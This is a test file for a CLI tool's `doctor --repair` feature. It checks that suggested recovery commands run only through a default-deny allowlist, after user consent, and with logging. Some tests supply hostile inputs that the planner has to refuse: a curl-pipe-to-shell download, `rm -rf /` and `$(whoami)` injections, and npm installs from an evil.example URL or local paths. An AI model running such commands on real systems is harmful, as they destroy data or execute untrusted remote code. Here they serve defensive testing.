// @doors: 1, 2, 3, 5
// Door 1 (response): the plan + the per-check outcomes ARE the contract — what
//   was offered, what the user chose, and whether it worked, kept separate.
// Door 2 (state): the repair log is the only thing this module writes, and the
//   over-mutation guard pins that a DECLINED run leaves the tier untouched.
// Door 3 (external calls): the point of the feature is that it runs commands.
//   WHAT is spawned is pinned — this node binary + this CLI entry, argv array,
//   no shell — not merely that a spawn happened.
// Door 5 (observability): every offer, every answer and every result lands in
//   .locks/doctor-repair.log as NDJSON, including the ones nobody ran.
// Door 4 N/A: no message-queue surface.

// Tests for Task 47 — `cmk doctor --repair`.
//
// THE FIELD SAYS DOCTORS DO NOT REPAIR. `brew doctor`, `flutter doctor` and
// `npm doctor` are all report-only; each hands the user a separately-named
// command to run (`flutter doctor --android-licenses`, `npm audit fix`). So
// plain `cmk doctor` stays exactly as it was, and `--repair` is an opt-in
// deviation that has to earn its place — which it does, because the kit's
// recoveries are overwhelmingly its OWN idempotent verbs, not the user's
// package manager.
//
// THE THREE RULES THAT MATTER, each taken from a verified primary source:
//   1. NO-TTY IS NEVER AN IMPLICIT YES. `gh` refuses outright when stdin is not
//      a terminal, naming the flag that would have worked. Silent-yes is
//      dangerous; silent-no exits 0 while leaving the system broken, which is
//      the HC-10 false-green class. We print the commands and name `--yes`.
//   2. `--yes` DOES NOT COVER EVERYTHING. `gh repo delete` ignores `--yes` when
//      the target is ambiguous and `apt -y` aborts anyway on the dangerous
//      class. Anything not on the executable allowlist stays print-only under
//      `--yes`, exactly as it is without it.
//   3. DEFAULT-DENY, NOT DENY-LIST. A recovery string the planner does not
//      RECOGNISE is print-only. A deny-list would execute every recovery a
//      future check invents until someone remembered to add it.

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { spawnSync } from 'node:child_process';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, statSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, relative } from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';
import { install } from '../packages/cli/src/install.mjs';
import { planRepairs, runRepairs, repairLogPath, EXECUTABLE_BINS, REPAIR_VERBS } from '../packages/cli/src/doctor-repair.mjs';
import { subcommandNames } from '../packages/cli/src/subcommands.mjs';

const repoRoot = join(fileURLToPath(new URL('.', import.meta.url)), '..');
const CLI_ENTRY = join(repoRoot, 'packages/cli/bin/cmk.mjs');

let sandbox;
let projectRoot;
let userDir;

beforeEach(async () => {
  sandbox = mkdtempSync(join(tmpdir(), 'cmk-repair-'));
  projectRoot = join(sandbox, 'proj');
  userDir = join(sandbox, 'user');
  mkdirSync(projectRoot, { recursive: true });
  await install({ projectRoot, userTier: userDir, noHooks: true });
});
afterEach(() => {
  rmSync(sandbox, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 });
});

const plan1 = (over = {}) =>
  planRepairs(
    [{ id: 'HC-4', name: 'INDEX', status: 'fail', message: 'stale', recoveryCommand: 'cmk reindex', ...over }],
    { knownVerbs: subcommandNames },
  );

/** A spawn that always succeeds, recording its argv. */
function okSpawn(calls) {
  return (cmd, args, opts) => {
    calls.push({ cmd, args, opts });
    return { status: 0, stdout: '', stderr: '' };
  };
}

// ---------------------------------------------------------------------------
describe('planRepairs — what may be run at all (Door 1, pure)', () => {
  it("offers a kit verb as runnable, carrying the check's own message as the impact line", () => {
    // The impact prose is NOT a second registry to maintain: the HC messages
    // already say what breaks and why. A parallel table would drift from them,
    // and the drifted copy is the one the user would read.
    const [p] = plan1();
    expect(p.runnable).toBe(true);
    expect(p.command).toBe('cmk reindex');
    expect(p.problem).toBe('stale');
  });

  it('plans nothing for a PASSING check, or for a failure with no recovery', () => {
    expect(planRepairs([{ id: 'HC-1', status: 'pass', recoveryCommand: 'cmk reindex' }], { knownVerbs: subcommandNames })).toEqual([]);
    expect(planRepairs([{ id: 'HC-1', status: 'fail' }], { knownVerbs: subcommandNames })).toEqual([]);
  });

  it('includes WARN checks — advisory still means there is something to offer', () => {
    const p = planRepairs(
      [{ id: 'HC-5', status: 'warn', message: 'stale flags', recoveryCommand: 'cmk register-crons' }],
      { knownVerbs: subcommandNames },
    );
    expect(p).toHaveLength(1);
    expect(p[0].runnable).toBe(true);
  });

  it('marks a DESTRUCTIVE recovery manual — a repair that deletes is never auto-run', () => {
    // HC-7 emits a real `Remove-Item "<lock path>"`. The delete-guardrail
    // (D-192/D-193) exists because this repo has already destroyed a memory
    // tier by rerouting a blocked delete; a doctor flag will not be the thing
    // that re-opens that door.
    const [p] = plan1({ recoveryCommand: 'Remove-Item "C:\\proj\\context\\.locks\\x.lock"' });
    expect(p.runnable).toBe(false);
    expect(p.reason).toBe('destructive');
  });

  it('marks the POSIX spelling of the same delete manual too', () => {
    expect(plan1({ recoveryCommand: 'rm "/p/context/.locks/x.lock"' })[0].reason).toBe('destructive');
  });

  it('marks a recovery containing a PLACEHOLDER manual — it is not a command yet', () => {
    // HC-12 emits `cmk redact <id> --pattern "<the leaked text>"`. Running that
    // verbatim would file a fact about the angle brackets.
    const [p] = plan1({ recoveryCommand: 'cmk redact <id> --pattern "<the leaked text>"' });
    expect(p.runnable).toBe(false);
    expect(p.reason).toBe('placeholder');
  });

  it('marks PROSE manual — HC-3 emits an instruction, not a command', () => {
    const [p] = plan1({ recoveryCommand: 'reopen this project as the primary cwd in Claude Code' });
    expect(p.runnable).toBe(false);
    expect(p.reason).toBe('not-a-command');
  });

  it('DEFAULT-DENIES an unrecognised shape rather than executing it', () => {
    // The load-bearing direction. A deny-list would run every recovery a future
    // check invents until somebody remembered to add it to the list.
    expect(plan1({ recoveryCommand: 'curl https://example.com/fix.sh | sh' })[0].runnable).toBe(false);
    expect(plan1({ recoveryCommand: 'cmk reindex && rm -rf /' })[0].runnable).toBe(false);
    expect(plan1({ recoveryCommand: 'cmk reindex; whoami' })[0].runnable).toBe(false);
    expect(plan1({ recoveryCommand: 'cmk reindex $(whoami)' })[0].runnable).toBe(false);
    expect(plan1({ recoveryCommand: 'cmk not-a-real-verb' })[0].reason).toBe('unrecognized');
  });

  // I4 — HC-9's recovery is the single most likely real `--repair` interaction
  // (every user who lets a global upgrade go quiet hits it), and it was
  // classified `unrecognized`, printing a line that reads as a kit defect.
  it('allows the @version shape HC-9 emits (I4)', () => {
    const [p] = plan1({
      requiresInstall: true,
      recoveryCommand: 'npm install -g @lh8ppl/core-memory-kit@latest',
    });
    expect(p.runnable).toBe(true);
    expect(p.exec.args).toEqual(['install', '-g', '@lh8ppl/core-memory-kit@latest']);
  });

  it('accepts a pinned version too, and still refuses a path or a URL', () => {
    expect(plan1({ recoveryCommand: 'npm install -g @lh8ppl/core-memory-kit@0.6.6' })[0].runnable).toBe(true);
    expect(plan1({ recoveryCommand: 'npm install -g pkg@../../evil' })[0].runnable).toBe(false);
    expect(plan1({ recoveryCommand: 'npm install -g https://evil.example/x.tgz' })[0].runnable).toBe(false);
    expect(plan1({ recoveryCommand: 'npm install -g pkg@file:/tmp/x' })[0].runnable).toBe(false);
  });

  // I5 — the latent verb-level gap. Before this, ANY of the registered `cmk`
  // verbs classified runnable, because the classifier only asked "is this a
  // verb?" and never "is this a REPAIR?". Unreachable today (all the literal
  // recoveryCommand sites are clean), but design §14.1's default-DENY claim
  // rested on a check that did not exist.
  describe('I5 — only REPAIR verbs are runnable, not every registered verb', () => {
    it('refuses the destructive verbs by name, with a reason the user can act on', () => {
      for (const cmd of ['cmk purge --all', 'cmk uninstall', 'cmk forget P-ABCDEFGH', 'cmk redact P-ABCDEFGH']) {
        const [p] = plan1({ recoveryCommand: cmd });
        expect(p.runnable, cmd).toBe(false);
        expect(p.reason, cmd).toBe('destructive');
      }
    });

    it('refuses a real-but-not-a-repair verb (a write is not a fix)', () => {
      const [p] = plan1({ recoveryCommand: 'cmk remember something' });
      expect(p.runnable).toBe(false);
      expect(p.reason).toBe('not-a-repair-verb');
    });

    it('PARTITIONS the live registry: every verb is either an allowed repair or print-only', () => {
      // The tripwire. A verb added to the CLI cannot quietly become executable
      // by `--repair` — it lands here as print-only until someone puts it in
      // REPAIR_VERBS deliberately, and this test names the split so the
      // decision shows up in a diff.
      const allowed = [];
      const denied = [];
      for (const verb of subcommandNames) {
        const [p] = plan1({ recoveryCommand: `cmk ${verb}` });
        (p.runnable ? allowed : denied).push(verb);
      }
      expect(allowed.sort()).toEqual([...REPAIR_VERBS].sort());
      expect(allowed.length + denied.length).toBe(subcommandNames.length);
    });

    it('every recoveryCommand the kit actually emits is still runnable or DELIBERATELY manual', () => {
      // The other direction, and the one that catches an over-eager deny: if a
      // real health-check recovery stopped being runnable, `--repair` would
      // silently become a printer. Read from the source rather than a copied
      // list, so a new recovery is covered the day it is written.
      const srcDir = join(repoRoot, 'packages/cli/src');
      const emitted = new Set();
      for (const f of readdirSync(srcDir).filter((n) => n.endsWith('.mjs'))) {
        for (const m of readFileSync(join(srcDir, f), 'utf8').matchAll(/recoveryCommand: '([^']+)'/g)) {
          emitted.add(m[1]);
        }
      }
      expect(emitted.size).toBeGreaterThan(5); // the scrape actually found things
      const MANUAL_BY_DESIGN = new Set([
        'reopen this project as the primary cwd in Claude Code', // prose, not a command
      ]);
      for (const cmd of emitted) {
        const [p] = plan1({ recoveryCommand: cmd });
        if (MANUAL_BY_DESIGN.has(cmd)) {
          expect(p.runnable, cmd).toBe(false);
        } else {
          expect(p.runnable, `${cmd} must stay runnable`).toBe(true);
        }
      }
    });
  });

  it('allows the npm global install HC-8 emits — the case this feature exists for', () => {
    // `requiresInstall` is seeded here because HC-8 really sets it, and the
    // contract asserted is that the planner CARRIES it through to the prompt:
    // it is what earns the extra "this installs software on your machine" line
    // before the y/N, which is the whole substance of NFR-10's consent gate.
    const [p] = plan1({
      requiresInstall: true,
      recoveryCommand: 'npm install -g @lh8ppl/core-memory-kit --allow-scripts=better-sqlite3',
    });
    expect(p.runnable).toBe(true);
    expect(p.requiresInstall).toBe(true);
  });

  it('does NOT allow an arbitrary npm subcommand smuggled in on the install shape', () => {
    expect(plan1({ recoveryCommand: 'npm run something' })[0].runnable).toBe(false);
    expect(plan1({ recoveryCommand: 'npm install -g ../../evil' })[0].runnable).toBe(false);
  });
});

// ---------------------------------------------------------------------------
describe('runRepairs — consent (Doors 1, 3)', () => {
  it('runs a repair on an explicit yes, and reports it fixed', async () => {
    const calls = [];
    const r = await runRepairs({
      plan: plan1(), projectRoot, cliEntry: CLI_ENTRY, interactive: true,
      prompt: async () => 'y', spawn: okSpawn(calls), log: () => {},
    });
    expect(r.outcomes[0]).toMatchObject({ id: 'HC-4', decision: 'accepted', outcome: 'fixed' });
    expect(calls).toHaveLength(1);
  });

  it('DECLINES on anything that is not an explicit yes — the default is No', async () => {
    for (const answer of ['', 'n', 'N', 'no', '\n', 'maybe', 'Y E S']) {
      const calls = [];
      const r = await runRepairs({
        plan: plan1(), projectRoot, cliEntry: CLI_ENTRY, interactive: true,
        prompt: async () => answer, spawn: okSpawn(calls), log: () => {},
      });
      expect(r.outcomes[0].decision, `answer ${JSON.stringify(answer)}`).toBe('declined');
      expect(calls, `answer ${JSON.stringify(answer)}`).toHaveLength(0);
    }
  });

  it('accepts `y` and `yes` in any case, and nothing else', async () => {
    for (const answer of ['y', 'Y', 'yes', 'YES', ' y ']) {
      const calls = [];
      const r = await runRepairs({
        plan: plan1(), projectRoot, cliEntry: CLI_ENTRY, interactive: true,
        prompt: async () => answer, spawn: okSpawn(calls), log: () => {},
      });
      expect(r.outcomes[0].decision, `answer ${JSON.stringify(answer)}`).toBe('accepted');
    }
  });

  it('reports failed-to-fix HONESTLY when the repair command exits non-zero', async () => {
    // Three distinct outcomes, never collapsed into two: a repair that ran and
    // failed is not the same fact as one the user declined, and telling them
    // apart is the difference between "try something else" and "try this".
    const r = await runRepairs({
      plan: plan1(), projectRoot, cliEntry: CLI_ENTRY, interactive: true,
      prompt: async () => 'y', log: () => {},
      spawn: () => ({ status: 3, stdout: '', stderr: 'nope' }),
    });
    expect(r.outcomes[0]).toMatchObject({ decision: 'accepted', outcome: 'failed', exitCode: 3 });
  });

  it('a spawn that THROWS is failed-to-fix, not a crash', async () => {
    const r = await runRepairs({
      plan: plan1(), projectRoot, cliEntry: CLI_ENTRY, interactive: true,
      prompt: async () => 'y', log: () => {},
      spawn: () => { throw new Error('ENOENT'); },
    });
    expect(r.outcomes[0].outcome).toBe('failed');
  });

  it('NON-INTERACTIVE prints the command and NAMES --yes — never an assumed yes', async () => {
    // gh's verified contract, adapted: it refuses and names the flag. We print
    // (the caller has already printed a report; refusing outright would throw
    // away the diagnosis the user asked for) and name the flag, and doctor's
    // own non-zero exit still stands, so this never reads as success.
    const calls = [];
    const lines = [];
    const r = await runRepairs({
      plan: plan1(), projectRoot, cliEntry: CLI_ENTRY, interactive: false,
      prompt: async () => { throw new Error('must not prompt without a terminal'); },
      spawn: okSpawn(calls), log: (l) => lines.push(l),
    });
    expect(r.outcomes[0]).toMatchObject({ decision: 'print-only', outcome: 'not-run' });
    expect(calls).toHaveLength(0);
    expect(lines.join('\n')).toContain('--yes');
  });

  it('--yes runs the allowlisted repairs without prompting', async () => {
    const calls = [];
    const r = await runRepairs({
      plan: plan1(), projectRoot, cliEntry: CLI_ENTRY, interactive: false, assumeYes: true,
      prompt: async () => { throw new Error('must not prompt under --yes'); },
      spawn: okSpawn(calls), log: () => {},
    });
    expect(r.outcomes[0]).toMatchObject({ decision: 'auto-accepted', outcome: 'fixed' });
    expect(calls).toHaveLength(1);
  });

  it('M6: under --yes the "installs software" NOTE is still printed, before the spawn', async () => {
    // Consent given in advance is a reason not to ASK, not a reason to stop
    // SAYING. Under --yes the prompt block never runs, so without this the one
    // line distinguishing an install from an index rebuild disappeared exactly
    // where the user was least able to intervene.
    const lines = [];
    await runRepairs({
      plan: plan1({ requiresInstall: true, recoveryCommand: 'npm install -g @lh8ppl/core-memory-kit@latest' }),
      projectRoot, cliEntry: CLI_ENTRY, interactive: false, assumeYes: true,
      prompt: async () => { throw new Error('must not prompt under --yes'); },
      spawn: okSpawn([]), log: (l) => lines.push(l),
    });
    const out = lines.join('\n');
    expect(out).toMatch(/installs software on your machine/i);
    // Before the spawn announcement, not after it.
    expect(out.indexOf('installs software')).toBeLessThan(out.indexOf('running npm install'));
  });

  // M7 — the exit-code policy, asserted rather than assumed.
  describe('M7 — `unfinished` drives the exit code', () => {
    it('counts a withheld-for-consent repair as unfinished (the WARN-only exit-0 hole)', async () => {
      const r = await runRepairs({
        plan: plan1(), projectRoot, cliEntry: CLI_ENTRY, interactive: false,
        prompt: async () => { throw new Error('no terminal'); }, spawn: okSpawn([]), log: () => {},
      });
      expect(r.unfinished).toBe(1);
    });

    it('counts a FAILED repair as unfinished', async () => {
      const r = await runRepairs({
        plan: plan1(), projectRoot, cliEntry: CLI_ENTRY, interactive: true,
        prompt: async () => 'y', log: () => {},
        spawn: () => ({ status: 3, stdout: '', stderr: '' }),
      });
      expect(r.unfinished).toBe(1);
    });

    it('a DECLINED repair is finished — the user was asked and answered', async () => {
      const r = await runRepairs({
        plan: plan1(), projectRoot, cliEntry: CLI_ENTRY, interactive: true,
        prompt: async () => 'n', spawn: okSpawn([]), log: () => {},
      });
      expect(r.unfinished).toBe(0);
    });

    it('a MANUAL-class item is finished — nothing was withheld, it is never runnable', async () => {
      const r = await runRepairs({
        plan: plan1({ recoveryCommand: 'rm "/p/x.lock"' }),
        projectRoot, cliEntry: CLI_ENTRY, interactive: true,
        prompt: async () => { throw new Error('must not prompt'); }, spawn: okSpawn([]), log: () => {},
      });
      expect(r.unfinished).toBe(0);
    });

    it('an APPLIED repair is finished', async () => {
      const r = await runRepairs({
        plan: plan1(), projectRoot, cliEntry: CLI_ENTRY, interactive: true,
        prompt: async () => 'y', spawn: okSpawn([]), log: () => {},
      });
      expect(r.unfinished).toBe(0);
    });
  });

  it('--yes does NOT cover the manual class — the blast radius has to be named by a human', async () => {
    // Two independent tools enforce exactly this: `gh repo delete` ignores
    // --yes when the target is ambiguous, and `apt -y` aborts anyway on held /
    // unauthenticated / essential packages.
    const calls = [];
    const r = await runRepairs({
      plan: plan1({ recoveryCommand: 'Remove-Item "C:\\p\\context\\.locks\\x.lock"' }),
      projectRoot, cliEntry: CLI_ENTRY, interactive: true, assumeYes: true,
      prompt: async () => 'y', spawn: okSpawn(calls), log: () => {},
    });
    expect(r.outcomes[0]).toMatchObject({ decision: 'print-only', outcome: 'not-run', reason: 'destructive' });
    expect(calls).toHaveLength(0);
  });

  it('never prompts for a manual repair even interactively — there is nothing to consent to', async () => {
    const r = await runRepairs({
      plan: plan1({ recoveryCommand: 'reopen this project as the primary cwd in Claude Code' }),
      projectRoot, cliEntry: CLI_ENTRY, interactive: true,
      prompt: async () => { throw new Error('must not prompt for a non-command'); },
      spawn: () => { throw new Error('must not spawn'); }, log: () => {},
    });
    expect(r.outcomes[0].decision).toBe('print-only');
  });
});

// ---------------------------------------------------------------------------
describe('runRepairs — what gets spawned (Door 3)', () => {
  it('runs a kit verb through THIS node + THIS CLI entry, argv array, no shell', async () => {
    // Never `cmk` off PATH: that resolves to whatever version is installed
    // globally, which is exactly the stale binary HC-9 exists to warn about —
    // repairing with the wrong version would be its own bug class.
    const calls = [];
    await runRepairs({
      plan: plan1({ recoveryCommand: 'cmk reindex --full' }),
      projectRoot, cliEntry: CLI_ENTRY, interactive: true,
      prompt: async () => 'y', spawn: okSpawn(calls), log: () => {},
    });
    const { cmd, args, opts } = calls[0];
    expect(cmd).toBe(process.execPath);
    expect(args).toEqual([CLI_ENTRY, 'reindex', '--full']);
    expect(opts.shell).toBeFalsy();
    expect(typeof opts.timeout).toBe('number');
    expect(opts.cwd).toBe(projectRoot);
  });

  it('REFUSES a bin outside EXECUTABLE_BINS, so the validator is reading a real gate', async () => {
    // scripts/validate-install-consent.mjs reads EXECUTABLE_BINS to enforce
    // NFR-10. If the constant were merely descriptive — a list next to
    // hand-written branches — the lint pass would be checking a comment and
    // would report OK while the code launched something else. This is what
    // makes the export load-bearing.
    const calls = [];
    const r = await runRepairs({
      plan: [{ id: 'HC-X', name: 'x', problem: 'x', command: 'pip install evil', runnable: true, exec: { bin: 'pip', args: ['install', 'evil'] } }],
      projectRoot, cliEntry: CLI_ENTRY, interactive: true,
      prompt: async () => 'y', spawn: okSpawn(calls), log: () => {},
    });
    expect(calls).toHaveLength(0);
    expect(r.outcomes[0].outcome).toBe('failed');
    expect(EXECUTABLE_BINS).not.toContain('pip');
  });

  it('runs the npm install as npm with an argv array', async () => {
    const calls = [];
    await runRepairs({
      plan: plan1({ recoveryCommand: 'npm install -g @lh8ppl/core-memory-kit --allow-scripts=better-sqlite3' }),
      projectRoot, cliEntry: CLI_ENTRY, interactive: true,
      prompt: async () => 'y', spawn: okSpawn(calls), log: () => {},
    });
    expect(calls[0].cmd).toBe('npm');
    expect(calls[0].args).toEqual(['install', '-g', '@lh8ppl/core-memory-kit', '--allow-scripts=better-sqlite3']);
  });
});

// ---------------------------------------------------------------------------
describe('runRepairs — the audit trail (Doors 2, 5)', () => {
  it('records every offer with its decision and result as NDJSON', async () => {
    await runRepairs({
      plan: [...plan1(), ...plan1({ id: 'HC-7', recoveryCommand: 'rm "/p/x.lock"' })],
      projectRoot, cliEntry: CLI_ENTRY, interactive: true,
      prompt: async () => 'y', spawn: okSpawn([]), log: () => {},
    });
    const lines = readFileSync(repairLogPath(projectRoot), 'utf8').trim().split('\n').map((l) => JSON.parse(l));
    expect(lines).toHaveLength(2);
    expect(lines[0]).toMatchObject({ schema: 1, hc: 'HC-4', command: 'cmk reindex', decision: 'accepted', outcome: 'fixed' });
    // The one nobody ran is recorded TOO. "We offered this and it was not run"
    // is the entry a later question actually needs; logging only the actions
    // would make a declined repair indistinguishable from one never offered.
    expect(lines[1]).toMatchObject({ hc: 'HC-7', decision: 'print-only', outcome: 'not-run' });
    for (const l of lines) expect(typeof l.ts).toBe('string');
  });

  it('OVER-MUTATION GUARD: a declined run changes nothing but the repair log', async () => {
    const snap = () => {
      const out = new Map();
      const walk = (dir) => {
        for (const e of readdirSync(dir, { withFileTypes: true })) {
          const p = join(dir, e.name);
          if (e.name === 'doctor-repair.log') continue;
          if (e.isDirectory()) walk(p);
          else out.set(relative(projectRoot, p), `${statSync(p).size}`);
        }
      };
      walk(join(projectRoot, 'context'));
      return out;
    };
    const before = snap();
    await runRepairs({
      plan: plan1(), projectRoot, cliEntry: CLI_ENTRY, interactive: true,
      prompt: async () => 'n', spawn: () => { throw new Error('must not spawn'); }, log: () => {},
    });
    expect(snap()).toEqual(before);
  });

  it('a broken log does not break the repair — the journal is best-effort', async () => {
    const calls = [];
    const r = await runRepairs({
      plan: plan1(), projectRoot: join(sandbox, 'does-not-exist'), cliEntry: CLI_ENTRY,
      interactive: true, prompt: async () => 'y', spawn: okSpawn(calls), log: () => {},
    });
    expect(r.outcomes[0].outcome).toBe('fixed');
  });
});

// ---------------------------------------------------------------------------
// The REAL bin, non-interactive. Unit-green is not works-on-real-input: this is
// the only assertion here that exercises commander's flag parsing, the TTY
// detection against a genuinely non-TTY stdin, and the wiring between doctor
// and the repair module — none of which a unit test can reach.
describe('the real `cmk doctor --repair` bin, with stdin not a terminal', () => {
  it('prints the repairs and names --yes, and never prompts or assumes yes', () => {
    const r = spawnSync(process.execPath, [CLI_ENTRY, 'doctor', '--repair'], {
      cwd: projectRoot,
      encoding: 'utf8',
      timeout: 120_000,
      stdio: ['ignore', 'pipe', 'pipe'], // stdin is NOT a TTY — the whole point
      env: {
        ...process.env,
        MEMORY_KIT_USER_DIR: userDir,
        CMK_SKIP_UPDATE_CHECK: '1', // no registry GET from a test
      },
    });
    const out = `${r.stdout ?? ''}${r.stderr ?? ''}`;
    // It ran at all (the flag parses, the process did not hang waiting on stdin).
    expect(out).toMatch(/HC-1/);
    expect(out).toMatch(/--yes/);
    // And it did not silently do anything: no repair reports as applied.
    expect(out).not.toMatch(/\bfixed\b/i);
    // M7 / Door 1 — the assertion this test was missing. A run that printed
    // repairs it could not apply must not look like a clean run to a script.
    // (This sandbox's HC-1 fails anyway, so the code is 1 by two routes; the
    // unit tests above pin `unfinished` as the independent driver.)
    expect(r.status).toBe(1);
  }, 130_000);

  it('exits 1 on a WARN-ONLY plan whose repairs were withheld — the false-green hole M7 closes', () => {
    // The case doctor's own failCount cannot see: nothing FAILED, so plain
    // `cmk doctor` correctly exits 0 — but `--repair` was asked to fix two
    // advisory findings and could not, and a CI script reading exit 0 would
    // call that a clean run. Driven through the real bin so it covers the
    // wiring, not just the helper.
    const r = spawnSync(
      process.execPath,
      ['-e', `
        const { runRepairs } = await import(${JSON.stringify(pathToFileURL(join(repoRoot, 'packages/cli/src/doctor-repair.mjs')).href)});
        const plan = [{ id: 'HC-5', name: 'cron', problem: 'stale flags', command: 'cmk register-crons',
                        runnable: true, requiresInstall: false, exec: { bin: 'cmk', args: ['register-crons'] } }];
        const r = await runRepairs({ plan, projectRoot: process.cwd(), cliEntry: 'x',
                                     interactive: false, prompt: async () => 'y', log: () => {} });
        if (r.unfinished > 0) process.exitCode = 1;
      `.replace(/\n\s+/g, '\n')],
      { cwd: projectRoot, encoding: 'utf8', timeout: 60_000, input: '' },
    );
    expect(r.status).toBe(1);
  });
});
